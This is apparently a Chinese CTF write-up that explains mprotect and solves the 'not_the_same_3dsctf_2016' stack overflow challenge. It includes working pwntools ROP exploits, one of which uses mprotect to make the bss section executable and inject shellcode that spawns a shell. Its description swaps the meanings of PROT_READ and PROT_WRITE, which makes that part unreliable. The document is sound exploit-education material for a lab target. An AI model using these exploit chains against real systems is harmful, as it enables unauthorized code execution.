## mprotect函数可以修改内存栈的权限

函数原型：

``` c
#include <unistd.h>
#include <sys/mmap.h>
int mprotect(const void *start, size_t len, int prot);
```

需要传入三个参数，mprotect()函数是把自start开始的，长度为len的内存区的保护属性修改为prot指定的值

mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。

prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：

1）PROT_READ：表示内存段内的内容可写；

2）PROT_WRITE：表示内存段内的内容可读；

3）PROT_EXEC：表示内存段中的内容可执行；

4）PROT_NONE：表示内存段中的内容根本没法访问。

需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。

如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。错误的原因主要有以下几个：
1）EACCES
该内存不能设置为相应权限。这是可能发生的，比如，如果你 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 标志为 PROT_WRITE。

2）EINVAL

start 不是一个有效的指针，指向的不是某个内存页的开头。

3）ENOMEM

内核内部的结构体无法分配。

4）ENOMEM

进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。 

如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV （Segmentation fault，段错误）信号，并且终止该进程

### 例题：not_the_same_3dsctf_2016 1

源码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF

  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");
  gets(v4);
  return 0;
}
int get_secret()
{
  int v0; // esi

  v0 = fopen("flag.txt", &unk_80CF91B);
  fgets(&fl4g, 45, v0);
  return fclose(v0);
}
```

存在栈溢出，在get_secret函数里将flag读取到f14g变量里，局部变量位于bss段

基本思路：利用栈溢出返回到get_secret函数执行，然后调用printf函数将f14g变量打印出来，容易实现

exp：

```python
from pwn import *
context(log_level='debug',arch='i386')
#a=process('./not_the_same')
a=remote('node5.buuoj.cn',29713)
flag=0x080489a0
f14g=0x080ECA2d
pop_esi_edi_ebp_ret=0x080483b8
printf_addr=0x0804F0A0
exit_addr=0x0804E660
#gdb.attach(a)
#pause()
payload=b"a"*(0x2d)+p32(flag)+p32(printf_addr)+p32(exit_addr)+p32(f14g)
a.sendline(payload)
#0x080483b8 : pop esi ; pop edi ; pop ebp ; ret
a.interactive()
```

然后，了解到mprotect函数，可以修改执行权限

exp：

```python
from pwn import *
context(log_level='debug',arch='i386')
#a=process('./not_the_same')
a=remote('node5.buuoj.cn',29997)
elf=ELF('./not_the_same')
flag=0x080489a0
shell=0x080ECA2d
pop_esi_edi_ebp_ret=0x080483b8
printf_addr=0x0804F0A0
exit_addr=0x0804E660
shellcode=asm(shellcraft.sh())
read_addr=elf.symbols['read']
mprotect_addr=0x0806ED40
#gdb.attach(a)
#pause()
#payload=b"a"*(0x2d)+p32(flag)+p32(printf_addr)+p32(exit_addr)+p32(shell)
payload=b"a"*0x2d+p32(mprotect_addr)+p32(pop_esi_edi_ebp_ret)+p32(0x80eb000)+p32(0x100)+p32(0x7)
payload+=p32(read_addr)+p32(pop_esi_edi_ebp_ret)+p32(0)+p32(0x80eb000)+p32(len(shellcode))+p32(0x80eb000)
a.sendline(payload)
a.sendline(shellcode)
#0x080483b8 : pop esi ; pop edi ; pop ebp ; ret
a.interactive()
```

通过mprotect函数改变bss段权限之后，往bss段写入shellcode，使shellcode可以执行